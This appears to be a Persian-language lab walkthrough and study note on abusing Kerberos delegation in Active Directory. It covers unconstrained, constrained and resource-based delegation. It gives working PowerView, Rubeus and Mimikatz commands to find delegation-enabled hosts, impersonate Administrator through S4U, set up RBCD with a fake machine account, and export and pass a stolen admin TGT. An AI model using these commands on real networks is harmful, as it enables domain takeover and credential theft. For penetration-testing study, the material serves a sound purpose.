
## **Kerberos Delegation**

Delegation
به سرویس‌ها اجازه می‌ده که به نمایندگی از یوزر به سرویس‌های دیگه دسترسی پیدا کنن. سه نوع اصلی داره:
![[Pasted image 20260428124618.png]]

---

### **1. Unconstrained Delegation (خطرناک‌ترین)**

سرویس می‌تونه TGT یوزر رو ذخیره کنه و به نمایندگی از اون به **هر سرویسی** دسترسی پیدا کنه.

**پیدا کردن:**
```powershell
Get-DomainComputer -Unconstrained | select samaccountname,dnshostname
Get-DomainUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)" | select samaccountname
```

**Abuse:**
- اگه Domain Admin به سرور Unconstrained وصل بشه، TGT اون ذخیره می‌شه
- با Rubeus یا Mimikatz می‌تونی TGT رو استخراج کنی:
```powershell
.\Rubeus.exe monitor /interval:5
# یا
sekurlsa::tickets /export
```
- بعد با TGT به DC دسترسی پیدا می‌کنی

---

### **2. Constrained Delegation**

سرویس فقط می‌تونه به **سرویس‌های مشخص‌شده** دسترسی پیدا کنه (لیست `msds-allowedtodelegateto`).

**پیدا کردن:**
```powershell
Get-DomainComputer -TrustedToAuth | select samaccountname,msds-allowedtodelegateto
Get-DomainUser -TrustedToAuth | select samaccountname,msds-allowedtodelegateto
```

**Abuse:**
- اگه پسورد/هش سرویس رو داشته باشی، می‌تونی با Rubeus تیکت بگیری:
```powershell
.\Rubeus.exe s4u /user:serviceaccount /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/target.prod.corp1.com /ptt
```
- بعد می‌تونی به سرویس هدف (مثلاً CIFS) به عنوان Administrator دسترسی پیدا کنی

---

### **3. Resource-Based Constrained Delegation (RBCD)**

به جای اینکه سرویس مبدأ مشخص کنه به کجا می‌تونه delegate کنه، سرویس **مقصد** مشخص می‌کنه چه کسی می‌تونه بهش delegate کنه (`msDS-AllowedToActOnBehalfOfOtherIdentity`).

**پیدا کردن:**
```powershell
Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll" -and $_.SecurityIdentifier -match "S-1-5-21-.*"}
```

**Abuse:**
- اگه `GenericAll`/`GenericWrite` روی یه کامپیوتر داشته باشی، می‌تونی RBCD رو configure کنی:
```powershell
# ساخت یه کامپیوتر جعلی
New-MachineAccount -MachineAccount FakePC -Password $(ConvertTo-SecureString 'Pass123!' -AsPlainText -Force)

# تنظیم RBCD
Set-DomainObject -Identity targetcomputer -Set @{'msds-allowedtoactonbehalfofotheridentity'=Get-DomainComputer FakePC -Properties objectsid | select -Expand objectsid}

# گرفتن تیکت
.\Rubeus.exe s4u /user:FakePC$ /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/targetcomputer.prod.corp1.com /ptt
```

---

![[Pasted image 20260428124415.png]]

این یه **Domain Controller** با Unconstrained Delegation هست - خیلی خطرناکه!

### **نکات کلیدی:**

**1. شناسایی DC:**
- `cn: DC`
- `dnshostname: DC.amin.com`
- `ridsetreferences: CN=RID Set,CN=DC,OU=Domain Controllers,DC=amin,DC=com`

**2. Unconstrained Delegation فعاله:**
useraccountcontrol: SERVER_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION

فلگ `TRUSTED_FOR_DELEGATION` یعنی این سرور می‌تونه TGT یوزرها رو ذخیره کنه.

**3. Service Principal Names:**
TERMSRV/DC
TERMSRV/DC.amin.com
HOST/DC/AMIN...

سرویس‌های RDP و HOST روی DC فعالن.

---

### **چرا خطرناکه؟**

DC خودش Unconstrained Delegation داره - این معمولاً **پیش‌فرض** هست چون DC باید بتونه به نمایندگی از یوزرها به سرویس‌های مختلف دسترسی پیدا کنه. اما اگه یه **سرور دیگه‌ای** (غیر از DC) Unconstrained داشته باشه، اونجا می‌تونی TGT ادمین‌ها رو بدزدی.

---

### **مرحله بعدی:**

دنبال **سرورهای غیر DC** با Unconstrained Delegation بگرد:

```powershell
Get-DomainComputer -Unconstrained | Where-Object {$_.cn -ne "DC"} | select samaccountname,dnshostname
```



## **Unconstrained Delegation چطور کار می‌کنه:**


- **سرور A** دارای Unconstrained Delegation هست
- **یوزر B** (مثلاً Domain Admin) به سرور A وصل میشه
- **TGT یوزر B** روی سرور A ذخیره میشه
- تو به عنوان مهاجم اگه سرور A رو compromise کرده باشی، می‌تونی **TGT یوزر B رو بدزدی**
- حالا با TGT دزدیده‌شده می‌تونی **خودت رو جای یوزر B جا بزنی** و به هر سرویسی که یوزر B دسترسی داره برو

وقتی یه **سرور** (نه user معمولی) Unconstrained Delegation داره:

1. یه یوزر (مثلاً Domain Admin) به اون سرور وصل میشه
2. سرور **TGT اون یوزر** رو توی حافظه‌ش ذخیره می‌کنه
3. حالا اگه تو اون سرور رو compromise کنی، می‌تونی **TGT اون یوزر رو بدزدی**
4. با اون TGT می‌تونی **خودت رو جای اون یوزر جا بزنی** و به هر سرویسی که اون یوزر دسترسی داره برسی
## **پس تفاوتش چیه؟**

- **نمی‌تونی مستقیماً به هر سرویسی وصل شی**
- باید **صبر کنی تا یه یوزر privileged** به سرور A وصل بشه
- بعد **TGT اون یوزر رو می‌دزدی**
- بعد **با هویت اون یوزر** به سرویس‌ها می‌ری

## **آیا می‌تونی خودت این پالیسی رو اضافه کنی؟**

بله، **اگه دسترسی کافی داشته باشی** (مثلاً Domain Admin):

```powershell
Set-ADComputer -Identity "ServerName" -TrustedForDelegation $true
```

ولی این **برای persistence استفاده نمیشه** چون:

- خیلی noisy هست
- راحت detect میشه
- نیاز به privileged access داره

---

## **مثال عملی:**

1. سرور "WebServer01" داره Unconstrained Delegation
2. تو WebServer01 رو compromise می‌کنی (مثلاً با RCE)
3. منتظر می‌مونی تا یه Domain Admin به WebServer01 وصل بشه
4. با Rubeus تیکت TGT اون Domain Admin رو می‌دزدی:
   Rubeus.exe monitor /interval:5
5. حالا می‌تونی با اون TGT به DC دسترسی پیدا کنی و DCSync بزنی


---

## **پس تفاوت اصلی:**

- **Unconstrained:** سرور می‌تونه TGT یوزرهایی که بهش وصل میشن رو ذخیره کنه
- **تو نمی‌تونی مستقیماً به سرویس‌ها دسترسی پیدا کنی** - باید اول TGT یه یوزر privileged رو بدزدی

Unconstrained Delegation = **یه آسیب‌پذیری** که بهت اجازه میده TGT یوزرهایی که به سرور وصل میشن رو بدزدی، نه اینکه مستقیماً به همه جا دسترسی داشته باشی.


## **TRUSTED_FOR_DELEGATION چیه؟**

این یه **flag** توی attribute به اسم `userAccountControl` هست که نشون میده این machine/user برای **Unconstrained Delegation** فعال شده.

---

## **userAccountControl چیه؟**

یه attribute توی Active Directory هست که مجموعه‌ای از flagها رو نگه میداره. هر flag یه ویژگی خاص رو مشخص می‌کنه:

- `ACCOUNTDISABLE` → اکانت غیرفعال
- `PASSWD_NOTREQD` → پسورد لازم نیست
- `TRUSTED_FOR_DELEGATION` → **Unconstrained Delegation فعاله**
- `TRUSTED_TO_AUTH_FOR_DELEGATION` → **Constrained Delegation با Protocol Transition فعاله**
- و غیره...

---

## **پس TRUSTED_FOR_DELEGATION یعنی چی؟**

وقتی این flag روی یه computer object یا user account فعال باشه، یعنی:

**"این سرور/یوزر می‌تونه TGT یوزرهایی که بهش وصل میشن رو ذخیره کنه و ازشون استفاده کنه"**

---

## **چطور چک کنیم؟**

```powershell
# پیدا کردن computerهایی که این flag رو دارن
Get-DomainComputer -Unconstrained

# یا با LDAP filter
Get-ADComputer -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)"
```

---

## **خلاصه:**

`TRUSTED_FOR_DELEGATION` = **نشانه Unconstrained Delegation** توی userAccountControl


![[Pasted image 20260428131344.png]]


### find IP via nslookup

```
nslookup APPSRV01
```

![[Pasted image 20260428131530.png]]

### logout and login on APPSRV01 via current user (offsec)

![[Pasted image 20260428131619.png]]


## run mimikatz and export ticket

```
mimikatz # sekurlsa::tickets
```

![[Pasted image 20260428131754.png]]


همونطور که میبینید تیکت ها در این سرور ثبت شده است حالا اگر این سرور یک وب سرور باشه باید منتظر بمونیم تا ادمین شبکه بیاد رو وب سرور  

حالا ما با اکانت ادمین لاگین میکنیم و وب سرور رو در مرورگر باز میکنیم 

![[Pasted image 20260428132102.png]]

![[Pasted image 20260428132113.png]]


![[Pasted image 20260428132120.png]]

بعد از اینکه ادمین وب سرور رو دید دوباره برمیگردیم به سرور وب که همون APPSRV01 بود و دستور 

```
mimikatz # sekurlsa::tickets
```

مجدد اجرا میکنیم 

![[Pasted image 20260428131924.png]]

همونطور که میبینید تیکت ادمین ثبت شده در سرور و ما میتونیم الان به واسطه اون تیکت بیایم و به هر سرویسی که میخواهیم دسترسی پیدا کنیم و یا با استفاده از اون تیکت حتی بیایم و حمله DCSYNC  بزنیم 

```
mimikatz # sekurlsa::tickets /export
```


![[Pasted image 20260428132440.png]]


```
mimikatz # kerberos::ptt [0;114fa7]-2-0-60a10000-admin@krbtgtPROD.CORP1.COM.kirbi
```

![[Pasted image 20260428132540.png]]


